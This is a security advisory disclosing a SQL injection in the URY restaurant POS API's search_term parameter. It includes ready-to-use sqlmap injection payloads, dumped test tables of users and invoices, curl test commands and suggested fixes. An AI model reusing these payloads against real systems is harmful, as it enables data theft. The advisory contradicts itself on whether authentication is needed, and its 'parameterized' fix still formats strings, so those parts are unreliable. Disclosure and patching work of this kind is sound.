# URY Open Source Restaurant Management System SQL Injection

## Product Link : [ury](https://github.com/ury-erp/ury)

### Summary

A critical SQL injection vulnerability has been identified in the URY Restaurant Management System's POS (Point of Sale) module. This vulnerability allows unauthenticated or low-privileged attackers to bypass input sanitization and execute arbitrary SQL queries against the backend MariaDB database. Successful exploitation could lead to unauthorized data access, data exfiltration, data modification, or complete database compromise.

## Vulnerability Details

### Technical Summary

The `overrided_past_order_list` API endpoint in the POS extension module improperly handles user-supplied input in the `search_term` parameter. The application uses Python string formatting (`"%{}%".format()`) to construct SQL queries instead of parameterized queries, allowing attackers to inject malicious SQL code.

### Affected Component

- **File**: `ury/ury/api/pos_extend.py`
- **Function**: `overrided_past_order_list()`
- **Lines**: 56, 63
- **Endpoint**: `/api/method/ury.ury.api.pos_extend.overrided_past_order_list`
- **HTTP Method**: POST
- **Authentication**: Required (but low privilege sufficient)

### Vulnerability Classification

| Classification | Details |
|----------------|---------|
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') |
| **OWASP Top 10** | Injection |
| **WASC** | WASC-19: SQL Injection |
| **CAPEC** | CAPEC-66: SQL Injection |

### CVSS v3.1 Score

**Base Score: 8.5 (HIGH)**

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
```

**Vector Breakdown:**
- **Attack Vector (AV)**: Network - Exploitable remotely
- **Attack Complexity (AC)**: Low - No special conditions required
- **Privileges Required (PR)**: Low - Basic user account sufficient
- **User Interaction (UI)**: None - No user interaction needed
- **Scope (S)**: Changed - Can affect resources beyond vulnerable component
- **Confidentiality (C)**: High - Total information disclosure
- **Integrity (I)**: Low - Some modification possible
- **Availability (A)**: None - No direct availability impact


### PoC

```
POST /api/method/ury.ury.api.pos_extend.overrided_past_order_list HTTP/1.1
Host: localhost:8000
Content-Type: application/json
User-Agent: Mozilla/5.0
Accept: application/json
Content-Length: 47

{"search_term":"*","status":"Draft","start":0}
```

<img width="462" height="239" alt="image" src="https://github.com/user-attachments/assets/08de380c-a7d8-4c3b-a5ae-a8af71d7a7d9" />


<img width="885" height="259" alt="image" src="https://github.com/user-attachments/assets/99a255e5-aa00-4280-a402-cf11b0026c38" />

```bash
[22:06:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: {"search_term":"-5917' OR 3019=3019#","status":"Draft","start":0}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"search_term":"' AND (SELECT 4950 FROM(SELECT COUNT(*),CONCAT(0x71767a6a71,(SELECT (ELT(4950=4950,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmX","status":"Draft","start":0}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"search_term":"' AND (SELECT 4647 FROM (SELECT(SLEEP(5)))FtuM)-- hRyJ","status":"Draft","start":0}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 9 columns
    Payload: {"search_term":"' UNION ALL SELECT NULL,NULL,CONCAT(0x71767a6a71,0x4454546e666a664c7372474d497662697251577a764d74564f63476251724352786a69546b787a78,0x716b767a71),NULL,NULL,NULL,NULL#","status":"Draft","start":0}
---
[22:06:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:06:20] [INFO] fetching columns for table 'tabUser' in database 'test_ury'
[22:06:20] [WARNING] reflective value(s) found and filtering out
[22:06:20] [INFO] fetching entries for table 'tabUser' in database 'test_ury'
Database: test_ury
Table: tabUser
[3 entries]
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
| email                 | name                  | enabled | creation            | password                | full_name     |
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
| admin@example.com     | Administrator         | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Administrator |
| cashier@example.com   | cashier@example.com   | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Cashier User  |
| test_user@example.com | test_user@example.com | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Test User     |
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
```

```bash
[22:07:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: {"search_term":"-5917' OR 3019=3019#","status":"Draft","start":0}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"search_term":"' AND (SELECT 4950 FROM(SELECT COUNT(*),CONCAT(0x71767a6a71,(SELECT (ELT(4950=4950,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmX","status":"Draft","start":0}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"search_term":"' AND (SELECT 4647 FROM (SELECT(SLEEP(5)))FtuM)-- hRyJ","status":"Draft","start":0}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 9 columns
    Payload: {"search_term":"' UNION ALL SELECT NULL,NULL,CONCAT(0x71767a6a71,0x4454546e666a664c7372474d497662697251577a764d74564f63476251724352786a69546b787a78,0x716b767a71),NULL,NULL,NULL,NULL#","status":"Draft","start":0}
---
[22:07:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:07:16] [INFO] fetching columns for table 'tabPOS Invoice' in database 'test_ury'
[22:07:16] [WARNING] reflective value(s) found and filtering out
[22:07:16] [INFO] fetching entries for table 'tabPOS Invoice' in database 'test_ury'
[22:07:16] [INFO] retrieved: 'SINV-00001','Draft','Main Branch','2025-10-28 11:48:01',' ','Main Hall','Test Customer 1','150.000000','0','2025-10-...
[22:07:16] [INFO] retrieved: 'SINV-00002','Paid','Main Branch','2025-10-28 11:48:01',' ','Main Hall','Test Customer 2','200.000000','0','2025-10-2...
[22:07:16] [INFO] retrieved: 'SINV-00003','Draft','Test Branch','2025-10-28 11:48:01',' ','VIP Room','Admin Test','350.000000','0','2025-10-28 11:...
[22:07:16] [INFO] retrieved: 'SINV-00004','Draft','Secret Branch','2025-10-28 11:48:01',' ','Secret Room','Secret Customer','999.990000','0','2025...
Database: test_ury                                                                                                                                  
Table: tabPOS Invoice
[4 entries]
+------------+---------------+----------+---------------------+----------+-----------------+---------------------+-------------+--------------+--------------+-----------------+------------------+------------------------+
| name       | branch        | status   | creation            | currency | customer        | modified            | grand_total | posting_date | posting_time | invoice_printed | restaurant_table | custom_restaurant_room |
+------------+---------------+----------+---------------------+----------+-----------------+---------------------+-------------+--------------+--------------+-----------------+------------------+------------------------+
| SINV-00001 | Main Branch   | Draft    | 2025-10-28 11:48:01 | NULL     | Test Customer 1 | 2025-10-28 11:48:01 | 150.000000  | NULL         | NULL         | 0               | Table-1          | Main Hall              |
| SINV-00002 | Main Branch   | Paid     | 2025-10-28 11:48:01 | NULL     | Test Customer 2 | 2025-10-28 11:48:01 | 200.000000  | NULL         | NULL         | 0               | NULL             | Main Hall              |
| SINV-00003 | Test Branch   | Draft    | 2025-10-28 11:48:01 | NULL     | Admin Test      | 2025-10-28 11:48:01 | 350.000000  | NULL         | NULL         | 0               | Table-VIP-1      | VIP Room               |
| SINV-00004 | Secret Branch | Draft    | 2025-10-28 11:48:01 | NULL     | Secret Customer | 2025-10-28 11:48:01 | 999.990000  | NULL         | NULL         | 0               | NULL             | Secret Room            |
+------------+---------------+----------+---------------------+----------+-----------------+---------------------+-------------+--------------+--------------+-----------------+------------------+------------------------+
```

## Impact Assessment

### Immediate Impacts

1. **Unauthorized Data Access**
   - Attackers can bypass access controls and retrieve sensitive business data
   - Cross-branch data leakage (e.g., accessing "Secret Branch" orders)
   - Extraction of customer PII, financial records, and transaction history

2. **Credential Theft**
   - User passwords (potentially hashed) can be extracted via UNION injection
   - API keys and session tokens may be exposed
   - Privilege escalation through stolen admin credentials

3. **Data Manipulation**
   - Modification of order statuses and amounts
   - Insertion of fraudulent transactions
   - Deletion of audit trails

4. **Business Logic Bypass**
   - Circumvention of branch-based access controls
   - Manipulation of inventory and pricing data
   - Unauthorized invoice generation or cancellation

### Long-term Consequences

- **Compliance Violations**: PCI DSS, GDPR, CCPA non-compliance
- **Financial Loss**: Fraudulent transactions, regulatory fines
- **Reputational Damage**: Loss of customer trust
- **Legal Liability**: Data breach notification requirements

## Remediation

### Immediate Actions Required

#### Priority 1: Apply Hotfix (Within 24 hours)

**Option A: Use Parameterized Queries (Recommended)**

```python
@frappe.whitelist()
def overrided_past_order_list(search_term, status="Draft", start=0, page_length=20):
    # SECURE: Use Frappe's built-in sanitization
    invoices_by_customer = frappe.db.get_all(
        "POS Invoice",
        filters={
            "customer": ["like", "%{}%".format(frappe.db.escape(search_term))],  # ✓ ESCAPED
            "status": status,
        },
        fields=[
            "name", "grand_total", "customer", "posting_time",
            "posting_date", "restaurant_table", "invoice_printed"
        ],
        limit_start=start,
        limit_page_length=page_length
    )

    return invoices_by_customer
```

**Option B: Use Prepared Statements**

```python
@frappe.whitelist()
def overrided_past_order_list(search_term, status="Draft", start=0, page_length=20):
    # SECURE: Parameterized query
    invoices = frappe.db.sql("""
        SELECT name, grand_total, customer, posting_time, posting_date,
               restaurant_table, invoice_printed
        FROM `tabPOS Invoice`
        WHERE customer LIKE %(search_term)s AND status = %(status)s
        LIMIT %(start)s, %(page_length)s
    """, {
        'search_term': f'%{search_term}%',
        'status': status,
        'start': start,
        'page_length': page_length
    }, as_dict=True)

    return invoices
```

#### Priority 2: Input Validation (Within 48 hours)

```python
def validate_search_input(search_term):
    """Validate and sanitize search input"""
    if not search_term:
        return ""

    # Length validation
    if len(search_term) > 100:
        frappe.throw(_("Search term too long (max 100 characters)"))

    # Character whitelist (adjust based on requirements)
    import re
    if not re.match(r'^[a-zA-Z0-9\s\-_@.]+$', search_term):
        frappe.throw(_("Invalid characters in search term"))

    return search_term

@frappe.whitelist()
def overrided_past_order_list(search_term, status="Draft", start=0, page_length=20):
    # Validate input first
    search_term = validate_search_input(search_term)
    # ... rest of secure implementation
```

## Verification Steps

### 1. Test Vulnerable System

```bash
# Test if system is vulnerable
curl -X POST https://your-ury-instance.com/api/method/ury.ury.api.pos_extend.overrided_past_order_list \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=YOUR_SESSION_TOKEN" \
  -d '{"search_term": "'\'' OR '\''1'\''='\''1", "status": "Draft"}'

# If vulnerable, you'll see more records than expected
```

### 2. Verify Patch Effectiveness

```bash
# After applying patch, same request should return only matching records
curl -X POST https://your-ury-instance.com/api/method/ury.ury.api.pos_extend.overrided_past_order_list \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=YOUR_SESSION_TOKEN" \
  -d '{"search_term": "'\'' OR '\''1'\''='\''1", "status": "Draft"}'

# Should return: empty result or error message
```

